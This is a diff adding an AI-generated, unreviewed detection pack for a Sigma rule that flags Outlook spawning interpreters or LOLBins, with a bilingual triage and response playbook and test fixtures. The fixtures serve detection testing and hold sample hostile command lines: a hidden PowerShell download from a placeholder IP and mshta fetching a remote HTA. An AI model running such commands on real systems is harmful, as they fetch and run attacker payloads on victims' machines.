@@ -1,0 +1,135 @@
+{
+  "rule": {
+    "id": "208748f7-881d-47ac-a29c-07ea84bf691d",
+    "title": "Suspicious Outlook Child Process",
+    "level": "high",
+    "status": "test",
+    "author": "Michael Haag, Florian Roth (Nextron Systems), Markus Neis, Elastic, FPT.EagleEye Team",
+    "path": "windows/process_creation/proc_creation_win_office_outlook_susp_child_processes.yml",
+    "url": "https://github.com/SigmaHQ/sigma/blob/05d1031f537e830b76da53bae2400c5814c89165/rules/windows/process_creation/proc_creation_win_office_outlook_susp_child_processes.yml",
+    "license": "DRL-1.1",
+    "techniques": [
+      "T1204.002"
+    ]
+  },
+  "playbook": {
+    "es": {
+      "summary": "Outlook (OUTLOOK.EXE) inició un intérprete, LOLBin o herramienta de ejecución que Outlook rara vez abre por sí mismo. Suele indicar que el usuario abrió un adjunto o enlace malicioso y se ejecutó código.",
+      "what_it_detects": "Eventos process_creation de Windows donde ParentImage termina en \\OUTLOOK.EXE e Image termina en un binario de la lista: cmd, powershell, pwsh, mshta, wscript, cscript, regsvr32, msiexec, msbuild, msdt, wmic, schtasks, hh, forfiles, svchost, bash/sh y otros. rundll32.exe se excluyó por falsos positivos.",
+      "why_it_matters": "Corresponde a ATT&CK T1204.002 (ejecución por el usuario de un archivo malicioso). Un adjunto o enlace que lanza un intérprete desde Outlook suele ser la primera etapa de un compromiso: descarga de payloads, persistencia o robo de credenciales.",
+      "triage_steps": [
+        "Revise Image y CommandLine del proceso hijo: busque comandos codificados (-enc), URLs, rutas en %TEMP% o Content.Outlook, y descargas con IWR, bitsadmin o certutil.",
+        "Identifique al usuario y al host; confirme que la sesión corresponde al titular de la cuenta.",
+        "Busque en el gateway de correo los mensajes recibidos por ese usuario en los 30 minutos previos: remitente, asunto, adjuntos y enlaces.",
+        "Revise los procesos hijos y nietos del proceso detectado en el mismo host dentro de +/- 15 minutos.",
+        "Correlacione conexiones de red, consultas DNS y archivos creados por el proceso hijo en esa ventana.",
+        "Calcule el hash de los archivos descargados o ejecutados y consúltelo en su plataforma de inteligencia de amenazas.",
+        "Busque el mismo remitente, adjunto o CommandLine en otros buzones y endpoints, y revise alertas previas del usuario y del host."
+      ],
+      "false_positives": [
+        "Complementos de Outlook o integraciones de CRM/telefonía que lanzan cmd.exe o powershell.exe para tareas auxiliares.",
+        "Macros VBA o reglas de Outlook con «ejecutar un script» configuradas por el usuario o por TI.",
+        "Usuarios que abren adjuntos legítimos, como instaladores .msi o archivos .chm enviados por soporte interno."
+      ],
+      "response_steps": [
+        "Valide con el usuario y con TI si la ejecución era esperada; si no lo es, trátela como incidente.",
+        "Aísle el endpoint mediante el EDR y preserve la memoria y los artefactos antes de terminar procesos.",
+        "Ponga en cuarentena el correo en todos los buzones y bloquee el remitente, los dominios y los hashes identificados.",
+        "Elimine la persistencia creada (tareas programadas, claves Run, servicios) después de documentarla.",
+        "Restablezca las credenciales del usuario, revoque sesiones y vigile actividad posterior antes de devolver el equipo a producción."
+      ],
+      "severity_rationale": "Es alta porque Outlook casi nunca debe iniciar intérpretes o LOLBins, y cuando lo hace suele tratarse de ejecución inicial a partir de correo malicioso."
+    },
+    "en": {
+      "summary": "Outlook (OUTLOOK.EXE) started an interpreter, LOLBin or execution tool that Outlook rarely starts by itself. This usually means the user opened a malicious attachment or link and code ran.",
+      "what_it_detects": "Windows process_creation events where ParentImage ends with \\OUTLOOK.EXE and Image ends with a listed binary: cmd, powershell, pwsh, mshta, wscript, cscript, regsvr32, msiexec, msbuild, msdt, wmic, schtasks, hh, forfiles, svchost, bash/sh and others. rundll32.exe is excluded because of false positives.",
+      "why_it_matters": "This maps to ATT&CK T1204.002 (the user runs a malicious file). An attachment or link that starts an interpreter from Outlook is often the first stage of a compromise. Payload downloads, persistence or credential theft can follow.",
+      "triage_steps": [
+        "Review the child's Image and CommandLine. Look for encoded commands (-enc), URLs, paths in %TEMP% or Content.Outlook, and downloads through IWR, bitsadmin or certutil.",
+        "Identify the user and host. Confirm the session belongs to the account owner.",
+        "In the mail gateway, find messages the user received in the 30 minutes before the alert. Note the sender, subject, attachments and links.",
+        "Review the detected process's children and grandchildren on the same host within +/- 15 minutes.",
+        "Correlate the child process's network connections, DNS queries and file writes in that window.",
+        "Hash the files that were downloaded or run, and check them in your threat intelligence platform.",
+        "Look for the same sender, attachment or CommandLine in other mailboxes and on other endpoints. Check earlier alerts for this user and host."
+      ],
+      "false_positives": [
+        "Outlook add-ins or CRM and telephony integrations that start cmd.exe or powershell.exe for helper tasks.",
+        "VBA macros or Outlook 'run a script' rules set up by the user or IT.",
+        "Users opening legitimate attachments, such as .msi installers or .chm help files sent by internal support."
+      ],
+      "response_steps": [
+        "Ask the user and IT whether the execution was expected. If it was not, handle it as an incident.",
+        "Isolate the endpoint with EDR. Preserve memory and artifacts before you kill any processes.",
+        "Quarantine the email in all mailboxes. Block the sender, domains and hashes you identified.",
+        "Document any persistence that was created (scheduled tasks, Run keys, services), then remove it.",
+        "Reset the user's credentials and revoke their sessions. Monitor for follow-on activity before you return the host to production."
+      ],
+      "severity_rationale": "High fits because Outlook should almost never start interpreters or LOLBins, and when it does, it is usually initial execution from a malicious email."
+    }
+  },
+  "fixtures": {
+    "positive": [
+      {
+        "description": "Outlook spawns PowerShell with a hidden download command, as if from a malicious attachment",
+        "event": {
+          "EventID": 1,
+          "Computer": "WS-0142.andes.example.com",
+          "User": "ANDES\\jperez",
+          "ParentImage": "C:\\Program Files\\Microsoft Office\\root\\Office16\\OUTLOOK.EXE",
+          "ParentCommandLine": "\"C:\\Program Files\\Microsoft Office\\root\\Office16\\OUTLOOK.EXE\"",
+          "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+          "CommandLine": "powershell.exe -nop -w hidden -c \"IWR http://203.0.113.15/update.txt -OutFile $env:TEMP\\u.txt\"",
+          "ProcessId": 6412,
+          "IntegrityLevel": "Medium"
+        }
+      },
+      {
+        "description": "Outlook spawns mshta.exe pointing to a remote HTA",
+        "event": {
+          "EventID": 1,
+          "Computer": "WS-0207.andes.example.com",
+          "User": "ANDES\\mrodriguez",
+          "ParentImage": "C:\\Program Files (x86)\\Microsoft Office\\Office16\\OUTLOOK.EXE",
+          "Image": "C:\\Windows\\SysWOW64\\mshta.exe",
+          "CommandLine": "mshta.exe http://invoice.example.org/view.hta",
+          "ProcessId": 7720,
+          "IntegrityLevel": "Medium"
+        }
+      }
+    ],
+    "negative": [
+      {
+        "description": "Outlook opens an image attachment with rundll32 and PhotoViewer.dll; rundll32.exe is not in the rule's list",
+        "event": {
+          "EventID": 1,
+          "Computer": "WS-0142.andes.example.com",
+          "User": "ANDES\\jperez",
+          "ParentImage": "C:\\Program Files\\Microsoft Office\\root\\Office16\\OUTLOOK.EXE",
+          "Image": "C:\\Windows\\System32\\rundll32.exe",
+          "CommandLine": "\"C:\\Windows\\System32\\rundll32.exe\" \"C:\\Program Files\\Windows Photo Viewer\\PhotoViewer.dll\", ImageView_Fullscreen C:\\Users\\jperez\\AppData\\Local\\Microsoft\\Windows\\INetCache\\Content.Outlook\\AB12CD34\\photo.jpg",
+          "ProcessId": 5120
+        }
+      },
+      {
+        "description": "User starts PowerShell from Explorer; the parent is not OUTLOOK.EXE",
+        "event": {
+          "EventID": 1,
+          "Computer": "WS-0142.andes.example.com",
+          "User": "ANDES\\jperez",
+          "ParentImage": "C:\\Windows\\explorer.exe",
+          "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+          "CommandLine": "\"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\"",
+          "ProcessId": 4388
+        }
+      }
+    ]
+  },
+  "generated": {
+    "tool": "content-pack/1",
+    "model": "claude-opus-5-5",
+    "at": "2026-10-26T02:47:30+00:00",
+    "review": "unreviewed",
+    "notice": "AI-generated content. Review it before relying on it. Fixtures are validated by Centinela's engine in session S7."
+  }
+}
